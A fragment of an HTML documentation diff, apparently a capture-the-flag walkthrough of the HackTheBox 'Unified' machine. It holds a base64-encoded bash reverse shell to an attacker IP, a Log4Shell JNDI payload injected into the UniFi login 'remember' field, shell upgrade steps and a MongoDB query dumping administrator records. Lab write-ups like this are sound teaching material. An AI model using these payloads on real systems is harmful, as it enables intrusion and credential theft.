-</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="c1"># --hostname: Victim IP</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>openjdk-11-jre<span class="w"> </span>maven
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/veracode-research/rogue-jndi<span class="w"> </span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="nb">cd</span><span class="w"> </span>rogue-jndi
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>mvn<span class="w"> </span>package
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="c1"># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="c1"># This will return: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="c1"># Get out of rogue-jndi folder and</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>java<span class="w"> </span>-jar<span class="w"> </span>rogue-jndi/target/RogueJndi-1.1.jar<span class="w"> </span>--command<span class="w"> </span><span class="s2">&quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}&quot;</span><span class="w"> </span>--hostname<span class="w"> </span><span class="s2">&quot;10.129.96.149&quot;</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a><span class="c1"># In the bash command, copy paste your reverse shell in base64</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="c1"># --hostname: Victim IP</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now, open a terminal, launch netcat abd the listening port you defined in your payload.</p>
 <p>With Burpsuite, get a request for login:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>POST /api/login HTTP/1.1
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Host: 10.129.96.149:8443
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Accept: */*
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>Content-Type: application/json; charset=utf-8
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>Origin: https://10.129.96.149:8443
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Content-Length: 104
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Sec-Fetch-Dest: empty
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>Sec-Fetch-Mode: cors
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>Te: trailers
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>Connection: close
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>POST /api/login HTTP/1.1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Host: 10.129.96.149:8443
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>Accept: */*
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>Content-Type: application/json; charset=utf-8
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>Origin: https://10.129.96.149:8443
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>Content-Length: 104
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>Te: trailers
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>Connection: close
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true}
+</span></code></pre></div></td></tr></table></div>
 <p>As we can read from the Unifi version exploit, the injectable parameter is "remember". So we insert there our payload and with Repeater, send the request:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST /api/login HTTP/1.1
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Host: 10.129.96.149:8443
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Accept: */*
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Accept-Language: en-US,en;q=0.5
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Accept-Encoding: gzip, deflate
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Content-Type: application/json; charset=utf-8
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>Origin: https://10.129.96.149:8443
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>Content-Length: 104
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>Sec-Fetch-Dest: empty
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>Sec-Fetch-Mode: cors
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>Te: trailers
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>Connection: close
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span>
+<span class="normal"><a href="#__codelineno-4-14">14</a></span>
+<span class="normal"><a href="#__codelineno-4-15">15</a></span>
+<span class="normal"><a href="#__codelineno-4-16">16</a></span>
+<span class="normal"><a href="#__codelineno-4-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>POST /api/login HTTP/1.1
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>Host: 10.129.96.149:8443
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>Accept: */*
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>Accept-Encoding: gzip, deflate
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>Referer: https://10.129.96.149:8443/manage/account/login
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>Content-Type: application/json; charset=utf-8
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>Origin: https://10.129.96.149:8443
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>Content-Length: 104
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a>Te: trailers
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a>Connection: close
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
+</span></code></pre></div></td></tr></table></div>
 <p>Once we send that request, our jndi server will resend the reverse shell:</p>
 <p><img alt="jndi server" src="../log4j/" /></p>
 <p>And in our terminal with the nc listener we will get the reverse shell. <a href="../spawn-a-shell/">Spawn it</a> with:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Ctrl-Z
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nb">fg</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>reset
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>xterm
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>Ctrl-Z
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="nb">fg</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>reset
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a>xterm
+</span></code></pre></div></td></tr></table></div>
 <p>user.txt is under /home/michael/</p>
 <h2 id="privilege-escalation">Privilege escalation</h2>
 <p>Do some basic reconnaissance:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>whoami
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>id
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>groups
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>sudo<span class="w"> </span>-l
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>uname<span class="w"> </span>-a
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>whoami
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>id
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>groups
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>uname<span class="w"> </span>-a
+</span></code></pre></div></td></tr></table></div>
 <p>Also we can see /etc/passwd to see other existing services/users.</p>
 <p>``bash
 cat /etc/passwd
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Results:
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>Results:
+</span></code></pre></div></td></tr></table></div>
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -17162,53 +17299,84 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 unifi:x:999:999::/home/unifi:/bin/sh
 mongodb:x:101:102::/var/lib/mongodb:/usr/sbin/nologin
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>After user unifi, we have a mondodb service. Also, we knew that under unifi version 6.4.54, it we could get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. 
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>[See mongodb cheat sheet](27017-27018-mongodb.md). 
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>First thing, find out on which port is running the service:
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>After user unifi, we have a mondodb service. Also, we knew that under unifi version 6.4.54, it we could get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. 
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>[See mongodb cheat sheet](27017-27018-mongodb.md). 
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>First thing, find out on which port is running the service:
+</span></code></pre></div></td></tr></table></div>
 ps aux | grep mongo
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Results: 
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>Results: 
+</span></code></pre></div></td></tr></table></div>
 unifi         67  0.4  4.2 1103744 85568 ?       Sl   11:44   0:46 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
 unifi       5183  0.0  0.0  11468  1108 pts/0    S+   14:47   0:00 grep mongo
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Port 27117. Let&#39;s interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace.
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>From the terminal of the victim&#39;s machine:
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>```bash
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>mongo --port 27117 ace --eval &quot;db.admin.find().forEach(printjson);&quot;
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a># mongo: To use mongo interactive command line
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a># --port: Indicate the port
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a># ace: default database in mongo
-</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a># --eval: evaluate JSON
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>Port 27117. Let&#39;s interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace.
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>From the terminal of the victim&#39;s machine:
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>```bash
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>mongo --port 27117 ace --eval &quot;db.admin.find().forEach(printjson);&quot;
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a># mongo: To use mongo interactive command line
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a># --port: Indicate the port
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a># ace: default database in mongo
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10"></a># --eval: evaluate JSON
+</span></code></pre></div></td></tr></table></div></p>
 <p>And now we have...</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>MongoDB shell version v3.6.3
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>connecting to: mongodb://127.0.0.1:27117/ace
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>MongoDB server version: 3.6.3
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>{
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>        &quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;),
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>        &quot;name&quot; : &quot;administrator&quot;,
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>        &quot;email&quot; : &quot;administrator@unified.htb&quot;,
